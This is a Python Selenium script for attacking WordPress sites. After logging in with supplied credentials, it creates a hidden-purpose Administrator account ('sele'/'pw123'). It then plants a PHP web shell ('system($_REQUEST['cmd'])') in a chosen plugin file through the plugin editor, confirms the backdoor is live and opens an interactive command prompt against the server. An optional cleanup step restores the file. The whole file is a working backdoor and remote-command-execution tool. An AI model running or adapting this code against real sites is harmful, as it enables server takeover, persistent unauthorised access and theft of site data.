#!/usr/bin/python3

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.select import Select
from bs4 import BeautifulSoup
import urllib.parse
import tkinter as tk
import argparse, logging, sys, time

FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'

def login(user, password):
    logging.info(f'Login with user: {user}')
    try:
        driver.get(args.url+'/wp-login.php')
        driver.find_element_by_name('log').clear()
        driver.find_element_by_name('pwd').clear()
        time.sleep(1)
        driver.find_element_by_name('log').send_keys(user)
        driver.find_element_by_name('pwd').send_keys(password)
        time.sleep(1)
        driver.find_element_by_name('wp-submit').click()
        if 'Error' in driver.page_source:
            print("Invalider Login")
            exit(-1)
    except Exception as e:
        print(f'Login Failed : {e}')
        exit(-1)

def crate_user():
    logging.info(f'Crate User {args.newUser}')
    try:
        if 'users.php' not in driver.page_source:
            print('Current User have no Administartion rights')
            exit(-1)
        driver.find_element_by_xpath("//a[@href ='users.php']").click()
        driver.find_element_by_xpath("//a[@href ='user-new.php']").click() 
        time.sleep(1)
        logging.info(f'Current Url: {driver.current_url}')
        logging.info('Create User')
        # set user data
        driver.find_element_by_id('user_login').send_keys('sele')
        driver.find_element_by_id('email').send_keys('sele@example.de')
        driver.find_element_by_id('pass1').clear()
        driver.find_element_by_id('pass1').send_keys('pw123')
        time.sleep(1)
        driver.find_element_by_name('pw_weak').click()
        driver.find_element_by_id('role').send_keys('Administrator')
        driver.find_element_by_id('createusersub').click()
    except Exception as e:
        print(f'Crate User Failed : {e}')
        exit(-1)

def write_payload(c_p_name, f_name):
    global P_BACKUP
    global P_BACKUPX
    logging.info(f'Write Payload in Plugin:{c_p_name} with File:{f_name}')
    payload = "<?php system($_REQUEST['cmd']); ?>"
    r = tk.Tk()
    r.withdraw()
    try:
        driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"a")
        driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"c")
        P_BACKUP = r.clipboard_get()
        #soup = BeautifulSoup(driver.page_source, 'html.parser') 
        #P_BACKUP = soup.find('textarea').text
        if payload not in P_BACKUP:       
            driver.find_element_by_xpath("//div[@role='textbox']").send_keys(payload)
            driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.ENTER)
            driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"v")
        else:
            print("is there")
            P_BACKUPX = P_BACKUP.replace(payload,'XXX')
            print(P_BACKUP)
            exit()
    except Exception as e:
        print(f'Write Payload Failed : {e}')
        exit(-1)
    #r.clipboard_clear()
    #print(P_BACKUP)
    r.update()
    r.destroy()
    time.sleep(3)

def cleanup():
    logging.info('Start Cleanup')
    try:
        driver.get(EDIT_PLUGIN_URL)
        time.sleep(1)
        driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"a")
        driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.DELETE)
        time.sleep(1)
        r = tk.Tk()
        r.withdraw()
        r.clipboard_clear()
        #print(P_BACKUPX)
        r.clipboard_append(P_BACKUPX)
        driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"v")
        time.sleep(2)
        driver.find_element_by_xpath("//input[@value='Update File']").click()

    except Exception as e:
        print(f'Cleanup Failed : {e}')
        exit(-1)
    r.update()
    r.destroy()
    time.sleep(3)

def edit_plugin():
    global EDIT_PLUGIN_URL
    logging.info('Start Edit Plugin')
    try:
        driver.find_element_by_xpath("//a[@href ='tools.php']").click()
        if 'plugin-editor.php' not in driver.page_source:
                print('Current User have no Administartion rights')
                exit(-1)
        driver.find_element_by_xpath("//a[@href ='plugin-editor.php']").click()
        time.sleep(1)
        try: # Click warning window
            driver.find_element_by_class_name('file-editor-warning-dismiss').click()
        except:
            pass
        time.sleep(1)
        p_all = Select(driver.find_element_by_xpath("//select[@id='plugin']")) # Get all plugins
        if len(p_all.options) == 0:
            print('There are no Plugins available')
            exit(-1)
        print("\n| Choose Plugin for Backdoor")
        while True:
            for p in p_all.options:
                print(f'[{p_all.options.index(p)}] - {p.text}')
            num = input('Plugin Nummber: ')
            if num.isdigit() and int(num) >=0 and int(num) < len(p_all.options):
                break
            else: 
                print('Wrong Input: Choose a Plugin Nummber')
        c_p_name = p_all.options[int(num)].text
        driver.find_element_by_id('plugin').send_keys(c_p_name)
        driver.find_element_by_xpath("//input[@value='Select']").click()
        url_edit = urllib.parse.unquote(driver.current_url)
        pf_name = url_edit.split('=')[-2].split('&')[0]
        p_name = pf_name.split('/')[0]
        f_name = pf_name.split('/')[1]
        logging.info(f'Current Url: {url_edit}')
        EDIT_PLUGIN_URL = driver.current_url
        write_payload(p_name, f_name)
        time.sleep(1)
        driver.find_element_by_xpath("//input[@value='Update File']").click()
    except Exception as e:
        print(f"Edit Plugin Fail : {e}")
        exit(-1)
    return p_name, f_name

def check_backdoor(p_name, f_name):
    logging.info('Check Backdoor')
    try:
        driver.get(f'{args.url}/wp-content/plugins/{p_name}/{f_name}')
        logging.info(f'Current Url: {urllib.parse.unquote(driver.current_url)}')
        if '404' in driver.page_source:
            print('Backdoor is missing or dont work')
            exit(-1)
    except Exception as e:
        print(f'Check Backdoor Failed : {e}')
        exit(-1)
    logging.info("Backdoor Online")    
    
def cmd():
    backdoor_url = driver.current_url
    logging.info(f'Execute code at: {backdoor_url}')
    try:
        while True:
            cmd = input("$ ")
            if cmd.lower() == 'exit':
                driver.quit()
                exit()
            elif cmd.lower() == 'cleanup':
                cleanup()
                break
            else:
                driver.get(f'{backdoor_url}?cmd={cmd}')
                cleantext = BeautifulSoup(driver.page_source, "lxml").text
                print(cleantext)
    except Exception as e:
        print(f'Comamnd Execution Failed : {e}')
        exit(-1)

def main():
    print("\n| Start Selenium Script")
    login(args.user, args.password)
    time.sleep(1)
    if not args.skipCreate:    
        crate_user()
        time.sleep(1)
        login(args.newUser,args.newPassword)
        time.sleep(1)
    if not args.skipBackdoor:
        p_name, f_name = edit_plugin()
        time.sleep(1)
        check_backdoor(p_name, f_name)
        cmd()
    #driver.get(args.url+'/wp-admin/index.php')
    print("\n| End")
    exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Selenium script that create a second User with Administrator role and place a backdoor in a plugin file for command execution')
    parser.add_argument('--url', required=True, type=str, help='Target Wordpress Url')
    parser.add_argument('-U', '--user', required=True, type=str, help='User Name')
    parser.add_argument('-P', '--password', required=True, type=str, help='User Password')
    parser.add_argument('-d', '--driver', required=True, help='Path to the chromedriver')
    parser.add_argument('-nU', '--newUser', nargs='?', default='sele', type=str, help='New User Name')
    parser.add_argument('-nP', '--newPassword', nargs='?', default='pw123', type=str, help='New User Password')
    parser.add_argument('-sC', '--skipCreate', action=argparse.BooleanOptionalAction, default=False, help='Dont create user with administrator role')
    parser.add_argument('-sB', '--skipBackdoor', action=argparse.BooleanOptionalAction, default=False, help='Dont crate backdoor')
    parser.add_argument('-H', '--headless', action=argparse.BooleanOptionalAction, default=False, help='Set ChromeOption headless for no window')
    parser.add_argument('-log', '--level', default=20, type=int, help='Set Logging Levels')
    args = parser.parse_args()
    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)
    args.url = args.url.rstrip('/')
    options = None
    if args.headless:
        options = webdriver.ChromeOptions()
        options.add_argument("log-level=3")
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_argument('headless')
        options.add_argument("disable-gpu")
    driver = webdriver.Chrome(args.driver, chrome_options=options)
    driver.set_window_size(1100,900)
    main()


    
